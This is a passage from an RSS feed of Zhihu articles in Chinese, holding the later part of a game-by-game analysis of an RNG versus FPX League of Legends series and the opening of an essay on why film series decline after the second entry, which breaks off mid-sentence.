data-original=\"https://pic2.zhimg.com/v2-d940d3d63aad58d2a4e36fa2abdace5d_r.jpg\"></figure><p>为什么这个蓝盾关键？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1612\" data-rawheight=\"1218\" class=\"origin_image zh-lightbox-thumb\" width=\"1612\" data-original=\"https://pic3.zhimg.com/v2-d3df64e77be2070b43ec10b684b8ee22_r.jpg\"></figure><p>上一秒，盲僧被插的像个刺猬。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1454\" data-rawheight=\"1222\" class=\"origin_image zh-lightbox-thumb\" width=\"1454\" data-original=\"https://pic2.zhimg.com/v2-b55729a81347be0d06776967f5b5fa61_r.jpg\"></figure><p>下一秒，滑板鞋拔矛，触发了盲僧的血手，盲僧同时使用渴血战斧。你会感觉，算上这个护盾的话，盲僧血量和刚刚一模一样。</p>\n<p>这就是蓝盾的意义，这波Doinb单人切死RNG下路双人组，吃满了GALA的伤害后安然无事。</p>\n<p>我们总结一下，FPX中期是怎么拖住的？</p>\n<p>第一，Doinb疯狂偷资源。</p>\n<p>第二，RNG关键转线策略不当+分线期没有做事。在转线期，他们只派了状态一般的格温去守中，被FPX找到机会，利用人数优势破掉中一、做了后续入侵视野，成功抓单鳄鱼和格温。而RNG虽然也破掉FPX中一，但是没有后续的视野跟进，而且分线期没有积极做事，所以并没能从破掉中一的活动中收获成果。</p>\n<p>第三，小虎冒进，导致最能拿大龙的一波没去拿，让盲僧发育到三件套。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>3、关键团战</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1238\" data-rawheight=\"880\" class=\"origin_image zh-lightbox-thumb\" width=\"1238\" data-original=\"https://pic4.zhimg.com/v2-d57050766a5cbd5b822f8c3bce1a9333_r.jpg\"></figure><p>这波没啥多说的，FPX开的太差了，兰博大招全空，没有人管在最后方的小虎。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>三、总结</h3>\n<p>这局赢的是RNG，但是我个人看法，中期两队在运营策略上，FPX赢得更多。</p>\n<p>在第一局结束以后我的看法就是，如果FPX能忍住不做最后一波那种粗糙的开团也就是不给机会的话，那么RNG将很难拿下后两局。</p>\n<hr>\n<h2>第二局</h2>\n<h3>一、BP分析</h3>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2722\" data-rawheight=\"1524\" class=\"origin_image zh-lightbox-thumb\" width=\"2722\" data-original=\"https://pic2.zhimg.com/v2-d61ad48342fecf20c3a22bb0ba202bb1_r.jpg\"></figure><p>相较于第一局，FPX做了一个调整，那就是舍弃兰博+瑟提，更换为皎月+杰斯。</p>\n<p>这一点很重要，我们在第一局提到，皎月更加适配一些主动开团的体系。FPX认为上一局的问题是不够主动，而且瑟提打格温的counter也宣告失败，所以转头更换了新的上野组合。</p>\n<p>在这个转主动的思路下，FPX第二轮做出自ban维鲁斯的行为就很容易理解了。</p>\n<p>维鲁斯最适合塔姆，但是这样就欠缺主动性，FPX希望下路更加主动。</p>\n<p>那么卡莎+开团英雄几乎是唯一选择。</p>\n<p>这里是我认为RNG全三场BP唯一可以商讨的点，两队第二轮ban的顺序是：维鲁斯-泰坦-露露-塔姆，事实上FPX希望转主动性的打法，从拿皎月+ban维鲁斯中就可以看得出来。那么此时ban塔姆的收效并不大，不如改ban卡莎，因为卡莎是最好配合开团辅助的AD。</p>\n<p>第二轮，FPX果然出卡莎，此时RNG已经明白对面想打强开，故拿出自保能力最强的霞作为应对。日女在面对强开体系时，有一定的自保和先手能力，但是都比较弱，论强开不如泰坦稳定，论反手不如布隆全面。</p>\n<p>从总的阵容体系来说，FPX更为极端，全队贯彻冲阵体系，更为符合这个版本的思路。而RNG如果能在第二轮选小炮可能会更好一点，选霞的话，就是全面寄希望于上中的冲阵，整体阵容的协同上要求比FPX更高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2718\" data-rawheight=\"1514\" class=\"origin_image zh-lightbox-thumb\" width=\"2718\" data-original=\"https://pic2.zhimg.com/v2-9124ba9609203c09c8e0d7f4a2dca9d1_r.jpg\"></figure><p>从对线来看，上路杰斯小优，中路鳄鱼小优，下路卡莎+芮尔更容易拿线权。</p>\n<p>FPX的阵容重点是双边路，盲僧皎月需要利用双控制的稳定性，多去边路越塔，两个人想杀鳄鱼会需要一定装备，但是配合杰斯/芮尔去越塔则是非常容易。所以FPX需要趁中路兵线被鳄鱼推进去回推的时候，线野联动来给予边路压力，快速滚雪球拿下比赛。</p>\n<p>RNG的阵容重点是中野，鳄鱼兰博需要利用中路线权，尽可能在中野2v2上做到事情，然后辐射下路。格温缺乏控制所以比较难帮，最好帮的是有日女的下路，RNG如果能在下路打开突破口限制卡莎发育，那中期胜算将会很大。</p>\n<p>这把我是真没想到，Doinb成为Carry到最后的那个人。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>二、具体赛况</h3>\n<p>1、个人和团队，Cryin的鳄鱼困境</p>\n<p>两波随意的R你们都看得到，不说了。我们说一下团队对于鳄鱼战术的理解问题，以及Cryin在兵线调度上的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1546\" data-rawheight=\"1038\" class=\"origin_image zh-lightbox-thumb\" width=\"1546\" data-original=\"https://pic2.zhimg.com/v2-3a544bf32a35e20a938d884adc5fce81_r.jpg\"></figure><p>从这里开始，八分半，FPX中野击杀了一次鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a378ad62aa8ad4422e60cace4d680e74_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"398\" class=\"content_image\" width=\"402\"></figure><p>随后，盲僧把兵线推进塔回家，Cryin复活上线。</p>\n<p>正常来说，这波鳄鱼可以把兵线彻底推进去，盲僧大概到那个时候才刚刚上线，Cryin会领先一波支援时间差。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-72d9374f08e196d5641302764d0849a5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>但是他没有，他把兵线推出去之后，反而是跑到野区拆了个假眼，把兵线放置在中路。</p>\n<p>这个时间点，Wei已经走到下路，RNG是打算对下路发起进攻的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4e4ddb7457a7a84f79e07616e94fde48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"390\" data-rawheight=\"390\" class=\"content_image\" width=\"390\"></figure><p>等到Cryin再度回到线上把兵线推进去的时候，两个打野在下半区已经照面了。</p>\n<p>如果Cryin这波直接推线支援，那么等到兵线来的时候盲僧必须要在塔下守线，而鳄鱼可以跟兰博一起到场突袭下路，拿到人头会非常简单。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1114\" data-rawheight=\"1016\" class=\"origin_image zh-lightbox-thumb\" width=\"1114\" data-original=\"https://pic3.zhimg.com/v2-f3e83b938a921b40ece859840bb4c60e_r.jpg\"></figure><p>最终的结果是，RNG没能获得击杀，只是利用先锋推掉下一塔，收益很少。</p>\n<p>这波是Cryin整个第二局的缩影，他对鳄鱼的线野联动理解我认为是有问题的。在明可以和兰博一起支援的兵线情况下，他的处理总是慢一步，进而没有办法和兰博产生联动。</p>\n<p>更麻烦的是，随后RNG开始放弃鳄鱼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-69e8587d79c52d0b58ac91d1ac5ddb0a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"402\" data-rawheight=\"402\" class=\"content_image\" width=\"402\"></figure><p>在下一塔被推掉以后，鳄鱼被放到了下路，双人组占中，打野往上靠。而FPX的分线是让杰斯继续维持对线，盲僧去下。</p>\n<p>那这种情况下，杰斯会被抓死，但是鳄鱼也没有资格去吃线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2482\" data-rawheight=\"1134\" class=\"origin_image zh-lightbox-thumb\" width=\"2482\" data-original=\"https://pic1.zhimg.com/v2-c42e33dd2315ce3c3b4f4508e518b40c_r.jpg\"></figure><p>双方打野对靠，FPX倒霉的是上路杰斯，RNG倒霉的则是下路的鳄鱼。</p>\n<p>问题是，鳄鱼不能被这么牺牲，而且RNG在下半区没有绕后眼可以实施绕后，但是FPX却在上路有绕后眼。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1858\" data-rawheight=\"414\" class=\"origin_image zh-lightbox-thumb\" width=\"1858\" data-original=\"https://pic2.zhimg.com/v2-2ec28e9abd9690227047878466379c21_r.jpg\"></figure><p>可是你要说鳄鱼彻底被牺牲了吗？倒也没有，注意，这段时间Ming一直在靠下，他出门直接来下半区，利用扫描排了一圈视野，做了一个河道眼。在小龙还有3分40秒刷新的时候，这么做就是保护鳄鱼不被越塔。</p>\n<p>我们对比一下双方半区力量，在对推的局面里，FPX在下路投入了中野辅三人，中野推塔辅助反蹲。而RNG只在上路投入了上野两个人，辅助在下做视野。</p>\n<p>这样会有一种可能，那就是RNG上路推进节奏因为人数缺失，容易被打断。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d163639ae99b87216058fefb0facfdd6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"406\" data-rawheight=\"390\" class=\"content_image\" width=\"406\"></figure><p>果然被打断。</p>\n<p>盲僧拆掉塔，直接TP去上抓死兰博。这波抓死直接导致RNG这波进攻轮次停止，他们没办法在这波之内推完上一塔，必须要下波再来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1594\" data-rawheight=\"1012\" class=\"origin_image zh-lightbox-thumb\" width=\"1594\" data-original=\"https://pic2.zhimg.com/v2-fcc86aabc7ab1f34d742bd649ea6995d_r.jpg\"></figure><p>下路皎月负责把兵线推进去，然后断掉了鳄鱼的TP支援，随后往野区逃命去了，这波成功勾引出了GALA的闪现，13分42秒，GALA交闪拿人头没拿到。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-14eb3d092fb0027d5dc4716daf017d06_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"410\" data-rawheight=\"408\" class=\"content_image\" width=\"410\"></figure><p>随后继续分线期运营，RNG还是把格温放在上路吃线，但是此时他们把鳄鱼调来野区一起吃资源，因为下半区已经彻底归FPX控制，鳄鱼不能去下半区发育。但是这样一来，鳄鱼的发育就会进一步停滞。那么问题来了，为什么RNG在自身小龙压力极大的情况下，还要坚持打上半区？</p>\n<p>因为上一塔没推掉，他们执着的想去推上一塔。</p>\n<p>而上一塔没推掉的原因，就是RNG想放弃鳄鱼但又不想放弃鳄鱼的矛盾态度。如Ming直接去上参与推塔或反蹲，那么盲僧的TP就是葬送自己的优势，RNG很大概率能拿下上一塔。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d6fb81e60540ad167b5a965eb5a1ccd9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"382\" data-rawheight=\"390\" class=\"content_image\" width=\"382\"></figure><p>等到RNG终于推掉上一塔的时候，小龙已经快要刷新了。</p>\n<p>你说推上一塔是否重要？当然，RNG推掉了自然会有收益。但是在小龙情况非常不利之时，这么执着于上一塔真的好吗？</p>\n<p>因为FPX有两条小龙，所以在第三条小龙RNG必须来争，不能轻易地放龙魂点团。但是因为RNG主打上半区，那么一个下半区没有视野、没有兵线优势、AD没有闪现的RNG，要怎么去争这波团呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1970\" data-rawheight=\"1068\" class=\"origin_image zh-lightbox-thumb\" width=\"1970\" data-original=\"https://pic4.zhimg.com/v2-bf8cf78d08a81e6e64480f32bf2fc483_r.jpg\"></figure><p>答案就是争不了。这波打完以后，因为鳄鱼长期没有线吃而盲僧有，两人的差距已经拉到天堑之别，没法追回来了。</p>\n<p>我们总结一下，RNG为什么玩不好鳄鱼战术？</p>\n<p>第一，Cryin把鳄鱼当做加里奥在玩，所以会有第一波的亏线支援。但是他玩的又不够加里奥，所以才会有不快速推线支援的兵线处理动作，这种处于两种打法之间的思路，是两头都得不到的。</p>\n<p>第二，RNG对鳄鱼的态度不明确。他们把鳄鱼放在下路，是想牺牲鳄鱼发育的；他们让Ming出门去下半区排视野做眼，又是想保护鳄鱼的。这种两端纠结的态度让他们在转线期处处落于被动：FPX下路进逼，鳄鱼只能放弃发育；FPX上路抓人，RNG只能被抓。</p>\n<p>这就是标题所谓的个人和团队的困境，无论是选手还是战队，他们对于鳄鱼战术的理解都不稳定，既可以当工具人又需要C，既可以牺牲又需要保护。再加上我没提到的一些选手熟练度问题，比如提前开R等等，导致最后鳄鱼表现和发育极度落后</p>\n<hr>\n<h2>第三局</h2>\n<p>这把我们只说BP，人机般的对局没什么复盘意义。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2714\" data-rawheight=\"1510\" class=\"origin_image zh-lightbox-thumb\" width=\"2714\" data-original=\"https://pic2.zhimg.com/v2-40169446a40e37be69b0bd2d8ea24735_r.jpg\"></figure><p>这把BP让RNG的英雄池短板暴露无遗。</p>\n<p>因为自己不能玩鳄鱼，所以鳄鱼给到对面，自己拿盲僧——但是盲僧被鳄鱼counter，而且FPX鳄鱼两路摇摆</p>\n<p>因为中路符合版本的前中期中单只有梦魇，但是梦魇打不过鳄鱼，所以只能出卡尔玛——佛耶戈、瑟提、格温全在外面</p>\n<p>卡尔玛加奥拉夫必须要等卡尔玛一个大件以后才有主动性，而且强度完全不如卡尔玛赵信，没有赵信的强开团能力——这个组合只能算是一个替代品，前三手出替代品是不是浪费？</p>\n<p>因为中野的强开能力不强，所以辅助必须要补牛头——小炮牛头下路拿什么抢线权？</p>\n<p>上路没法出鳄鱼，中路更多英雄没法出，导致整体BP全部受限。</p>\n<p>在MSI上，RNG就因为英雄池问题一度非常难做BP，好在后来Cryin练出了梦魇和中单卢锡安，但是在夏季赛的版本，中路前期对抗性进一步提升，梦魇很多时候都无法拿出来。在卢锡安持续被ban的情况下，Cryin能拿出什么英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"738\" class=\"origin_image zh-lightbox-thumb\" width=\"1032\" data-original=\"https://pic3.zhimg.com/v2-32296fd931ea48ed3ec87dcf5c5171ca_r.jpg\"></figure><p>这里是夏季赛到现在为止，BP率超过25%的中路英雄列表。</p>\n<p>现在RNG很多时候需要依靠小虎，因为只有他跟上了版本练出了格温，成为队伍中期可能的支柱。但是一旦格温被ban，但靠盲僧在11.12或11.13是没法做到什么的，我在之前的一条动态里也给大家分享过外赛区的一个数据：上单盲僧胜率不断降低，因为好打盲僧的英雄越来越多。在这种大趋势下，上路又能拿出当前版本多少强势英雄？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1044\" data-rawheight=\"674\" class=\"origin_image zh-lightbox-thumb\" width=\"1044\" data-original=\"https://pic2.zhimg.com/v2-0942a1ca67b30996cc788517ac342cb9_r.jpg\"></figure><p>这是夏季赛到目前为止，BP率超过25%的上路英雄列表，鳄鱼、瑟提没法拿出来，成为小虎最致命的BP点。</p>\n<p>我不是很想说这些，因为MSI之前这些都说的差不多了。我以为在MSI上RNG解决了这个问题，但是伴随着版本的变化和格温、佛耶戈的解锁，上中英雄池发生巨变，如今摆在RNG面前的问题更加严峻。</p>\n<p>而且多提一句，Cryin的亏线支援思路，我不知道是谁定的，但是太有问题了：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2cab28661150dac291e52d604f1bf9d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"396\" data-rawheight=\"398\" class=\"content_image\" width=\"396\"></figure><p>这波卡尔玛去支援上路，被Doinb蹲到单杀，成为中路对线转折点。</p>\n<p>看兵线，Doinb是推一波兵线进塔，然后去支援的，Cryi是直接去上半区支援。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1196\" data-rawheight=\"1052\" class=\"origin_image zh-lightbox-thumb\" width=\"1196\" data-original=\"https://pic2.zhimg.com/v2-82cf3abff5a0ce0114e666eaeae8db4d_r.jpg\"></figure><p>亏线的结果就是5级打6级。</p>\n<p>虽然说6级对卡尔玛提升不是质变，但是多一级的大招，无论是Q的伤害还是E的护盾时间都会有提升。无论如何，没有这么支援的道理。</p>\n<hr>\n<h2>总结</h2>\n<p>RNG现在要考虑考虑怎么进季后赛了。隔离期间已经结束一段时间了，再练不出新东西就只能是人的问题了。而且相对于操作问题，比如GALA跳脸或者Cryin的迷之大招，我更关心的是RNG在中期运营层面的落后，这是我在以往的RNG身上所未曾发现的，希望失败不要影响他们的心态。</p>\n<p>这里为了防止理解错误，必须要说一句。RNG在中期运营的落后，不是指他们不做事，而是指他们做了事却没什么收益。比如第一局，RNG一波运营拿下先锋+小龙+下一塔，但因为防守不当导致中路丢失，进而导致鳄鱼被抓，还被FPX做了深入视野。反过来自己推掉FPX中塔的时候，因为人手不足所以没法做眼，这就是典型的“做了事但是没收益”，类似的还有第二局对鳄鱼的态度不明确，没有让Ming去上路帮忙拆塔，但是又非常执着于上一塔。</p>\n<p>FPX这一局展现出来的中期运营能力和抓机会能力很强，如果他们能保持这个状态，我觉得他们后续比赛的表现一定会一路上扬，前提是保持的住。</p>\n<p>但是Nuguri被疯狂单杀是不该的，如果不是他的ID是Nuguri，这换任何一个队伍可能下场直接换二队上来了。如果不是整个队伍中期运营实在强，他这种打法和状态在这个打前中期的版本基本不可能取得胜利，希望他尽快调整。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/YInTIanCLANG?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">尹天</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/384312961?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"为什么很多系列电影从第三部开始，口碑就不及前作了？","date":"2021-06-28 13:53:24","description":"\n<p>谈一谈个人的看法。</p>\n<p>对于一部电影而言，它最重要的东西是什么呢？又是什么区分开了电影和电视剧，让前者成为了艺术，而后者成为了快消品？这个答案当然会有很多层面和角度，但其中一个，必然会是主题表述上的-----不同于电视剧，每一部电影，都会是导演围绕既定中心的一次自我表达，表述逻辑的完整性和呈现方式，构成了这部作品客观质量的重要标准。</p>\n<p>如果我们将电影看作导演表达自己思想与内心的艺术门类，那么表达内容和表达效果理所当然地成为了最重要的环节。这一点，正是电视剧不具备的-----电视剧以剧情的连接作为特性，拉出了整体更长的剧情线索和叙事空间，从而增加了更多的元素丰富性，同时也带动了每一个单集中叙事的局部化，在这两个方面上让观者保持兴趣，留住悬念，将收视维持下去。这当然是契合商业化考虑的模式，但也让每一集作为独立作品的表意完整性被大幅度地打破，甚至彻底不复存在了。</p>\n<p>而电视剧的独特优势，也必然地被电影行业尝试复刻。这就带来了以三部曲为代表的系列电影这一产物。从创作角度上讲，这带来了更大的创作空间、素材资源，从而给予了自我表达系统上的更多可能性，有助于创作者的设计和灵感得到更多的发挥，从而拍出更为震慑人心的成果瞬间。而从商业性角度上讲，这也促成了电影对电视剧在消费者延续性、消费者基数扩充上的照搬，让电影获得比单片更大的商业成功。</p>\n<p>然而，这就带来了一个巨大的问题：电影终究是与电视剧不同---或”理应不同“----的作品，艺术性相对较强而商业性相对较弱。因此，在动用了电视剧的连续性模式而实现了商业诉求的同时，艺术性的保留必要，便为创作者们提出了更高的要求：他们需要在系列中的每一部作品里都实现相对的完整表达，并且让作品与作品串联后的整体形成更高层次上的完整表达。换句话说，单片独立的主题设定与表述系统要足够完善，而每一部的主题也要形成串联后大主题的一部分，各单片中的要素和线索也要再次整合，支撑着表述系统的整合，形成整个系列层级上的表达逻辑，对大主题进行引导。</p>\n<p><b>简而言之，系列中单片要有作为独立作品的完整性，而系列整体又要成为一个大的“作品”。那么，这就必然对创作者的能力有了很高的要求，且系列作品数量越多、体量越大，把握难度就越高。这种难度，就给予了系列电影创造的高难度，且越往后就越难。</b></p>\n<p>事实上，即使是拥有原作小说为基础、基本顺利地拍摄下去的超长篇系列《哈利波特》电影版，也在中后期的改编中出现了线索过多、关系过乱等基于体量基础的困难，被迫以“消除部分线索”与“各线均不深入且平行发展”的方法进行应对，让系列的中后期作品在一定程度上失去了戏剧性的起伏和强弱，变成了跑图转场一样的平铺直叙。</p>\n<p>有小说作为明确基础的电影尚且如此，可见系列电影创作的难度之高。而近年来，漫威影业将自己的电影系列赋予了“宇宙”的概念，也出现了在作品表达完整性上的巨大困难，单片质量良莠不齐，发挥起伏波动巨大。漫威影业固然也有着原作漫画的基础，但体量过于巨大，几乎不可能原样照搬。在商业角度上，不用多说，漫威影业创造了商业电影世界里迄今为止的最持久的“现象”，充分印证了电影系列在电视剧化后的天然优势。然而，在艺术角度上，漫威电影宇宙，却遭到了科波拉和西科塞斯的批评。</p>\n<p>科波拉对于漫威的看低，或许来自于双方在电影创作理念的出发点和理解观念不同所导致---电视剧化的创作，电影化的表述。</p>\n<p>对于科波拉这样的大师而言，他所理解的电影，应当是偏向于传统的：一部单片作品，要看到完整的主题表达，严密的主题叙述逻辑，一切都围绕着主题表达的要素分布，并构成一个能够自洽的主题表达系统。在一般意义上讲，电影是导演将自己的想法传达给观众的媒介，形成自己对主题的表达。再延伸来讲，许多大师级人物 更是会有贯穿一生创作的某种作者性，而构成了其人的“永恒主题”——母题。我们在描述电影艺术性之时，经常会用到“作者性”一词，即是创作者的自我表达——不是单纯地对剧本进行影像化，而是以剧本为蓝本表达自己的想法。</p>\n<p>而如果我们审视漫威的创作，会轻易地发现很多非电影化的电视剧式手法。他们将一部单片中的元素、人物的发展、甚至剧情本身，延续到下一部单片之中，并让它成为了一个常规操作。这样一来，本作的观众会被引导到下一部作品中而形成话题和票房的延续，又能够有远超一般电影的容量来展开巨型的世界观、来创造更多的商业价值和粉丝粘性。就像我们通常会叫的那样，“电影连续剧”。</p>\n<p>在有些作品中，这样的启后，会以片尾彩蛋的形式进行。这是一个好的手法，不动摇本篇的完整性。但在一些作品中，本篇的戏份资源也被用于启后，甚至连基本剧情在单片中的完整性都被打破、成了说书一般的“预知后事如何请听下回分解”（比如《复仇者联盟三》），对本篇的表达就不那么无碍了-----从基础叙事的角度来看，灭霸的战争这一单片中引出的核心事件，显然没有得到任何解决；而从主题表达的角度来看，承载表述核心任务的钢铁侠为代表，所有角色都半途中断，直到后续的第四部才得到了收束，例如钢铁侠身上的“人类之身，比肩神明”，第三部是引子，让他看到了灭霸的强大并感受到自身保护他人的无力，而后的第四部才完成了打响指的“牺牲自我代价下的比肩神明，保护大家”。</p>\n<p>另外，在电影拍摄中，漫威会根据粉丝的喜好，创造一些“爆点”元素并反复深化——比如雷神和洛基的基情，电影中的冷幽默小段子。同样地，有些作品中它们的程度适量，这就很ok；有些作品中它们反而喧了宾夺了主（比如《雷神三》），单片的主题表达的系统甚至剧情自身的节奏都被切碎，就很不ok了。它只关乎于讨观众的欢喜，却与主题表达基本构不成联系。对于“一切元素服务于主题表达系统”的理念，这无疑是一种逆反。</p>\n<p>在很多时候，对于自己重视、在宇宙中分量较重的作品，漫威会精心管理，拍出表达完成度不错的作品。《钢铁侠》系列，《复仇者联盟一、二》《雷神一》，包括后续的《蜘蛛侠》系列，都是如此。但当他们面对一些别的系列时，似乎就不那么上心，对主题也不太在意，而是更多地进行爆点元素的堆积来投观众所好、并大量地“启后”了。而我们也会发现，劣化作品出现的曲线，与系列的发展延长构成直接同步，这也说明了漫威在面对系列愈发扩容后的难以应对，也正是系列电影“越长越难拍”的本质体现，</p>\n<p>实际上，就像前文所述，对于系列电影，一个很标准的操作方式是：单片有单片在某一阶段和层级上的主题，并在单片中构成完整的表达；而作为系列，又有不同阶段和层级的主题组合起来的、形成一体化后的大主题。由于创作能力和体量积累的主客观原因，漫威无法完成这个任务，但他们也绝非孤例。在近期上映了“实质上的《追龙》第三部”《追虎擒龙》中，我们就可以看到王晶在延续系列质量上的后继乏力。</p>\n<p>《追虎擒龙》，是一部产生自标准模式下的无功无过之作品，延续了《追龙》第一部中的故事，体现了第一部里跛豪与徐乐的结局，也在基础的叙事环节上构成了对第一部的对应。《追龙》里，跛豪和徐乐身处于完全无秩序的混乱香港，各帮派毫无约束、自由厮杀，而警察机构内也各自为政、缺乏统领。在黑道与官方的双重混乱之下，平民百姓的生活完全没有任何的稳定可言。而跛豪和徐乐，基于同一理想，带来了一种基于暴力的相对秩序化机制---建立警队内部的“贪污秩序化”和黑道系统的“分赃秩序化”，从而保证了香港社会的相对稳定运转状态，平民依旧要面临压制和剥夺，但却“有法可循”，暴力事件对社会秩序的破坏也变少了。这是跛豪和徐乐的理想，但终究不是最完美的状态，暴力之基础必然带来难以长久持续的缺陷，而《追虎擒龙》，便是对缺陷的揭露、最完美状态的呈现-----徐乐和跛豪价值观的变质，暴力秩序体系运转上的变质，最终被更理想形态的取代。</p>\n<p>然而，从成片质量上看，《追虎擒龙》却没有拍出足够独立的主题表达性，而是在很大程度上依托于《追龙一》，而在单片内部的独立表达层面上，更准确的形容或许是：有所努力，一定效果，远远不够。</p>\n<p>首先，为了方便“警察抓贼”这样一个基础剧情的展开，王晶便将更多的正面描写内容放在了廉政公署的古天乐和林家栋一边。而作为一种标配，这条线索上有着人物成长的元素：警察要经历打击，才能从绝对的理想主义者变成深明现实的现实主义者，才能从纯真走向成熟，在残酷的世界中真正获胜，而不是壮志未酬。电影里。古天乐经历的第一次洗礼，是自以为正义的仗义执言后的被打，这让他意识到，言语道理的胜利并不能驳倒恶人，而是会被恶人以力量压制，“以论理获胜”的“不脏手”式纯粹正义，并不能贯彻在现实结果中。这个变化，具象成为了他从打着哆嗦被打到干练探员的变化。第二次洗礼，则是林家栋的死。这让他直面代价的残酷，意识到自己需要面对什么风险。</p>\n<p>而这两次洗礼，造就了一个不那么绝对正义的古天乐——给郑则仕的打火机安装窃听器，并将录音交到梁家辉手里，分化了他们的兄弟情，且在郑则仕的悲痛欲绝面前默不作声、掩盖真相，避免郑则仕对自己的逆反心理，无法获取证词。这种对于郑则仕的欺骗和利用，与电影开始时的古天乐形成了对比，淡化了他的“绝对正义”，让他从理想主义者变为现实主义者，从纯粹追求变为结果追求，也在一定程度上辅助了作品“何谓正邪”主题的表达。</p>\n<p>而从“徐乐”吴镇宇和“跛豪”梁家辉的角度，王晶当然也没有将他们置于纯粹的恶，而是展现出了两面性。电影里大篇幅地“展现”了反派集团的情义：梁家辉与吴镇宇的同袍，吴镇宇与郑则仕的亲情，甚至梁家辉与打手部下的情义。而在后半段，电影也展现了他们情义的分化变质：吴镇宇与梁家辉的分裂，郑则仕对吴镇宇的背叛。然而，这一切又带着很大程度上的无奈：吴镇宇和梁家辉的分裂，来自于找人接班梁家辉生意的需要，“阿豪要退休的”；郑则仕对吴镇宇的背叛，则来自于对吴镇宇“暴力解决”之手段的恐惧，担心吴镇宇处理掉手下平息危机后的下一目标便是自己。</p>\n<p>事实上，这种无奈之下的情义变质，构成了对电影主题的深层引导。郑则仕和吴镇宇在最后的会面种，说出了他们发自《追龙》第一部中的理想与实现：吴镇宇划分势力规则后，香港拥有了相对秩序，这也构成了他们选择走入犯罪道路的一个推动契机。然而，就像电影里的种种背叛发生时的起因所体现的那样，吴镇宇背叛梁家辉的“生意”考虑、郑则仕背叛吴镇宇的“保命”考虑，都是基于利益与暴力之相对秩序化的局限性表现。郑则仕说的“你变了”，则是走入这种负面变化之被动、被迫性的体现。他们的本性并非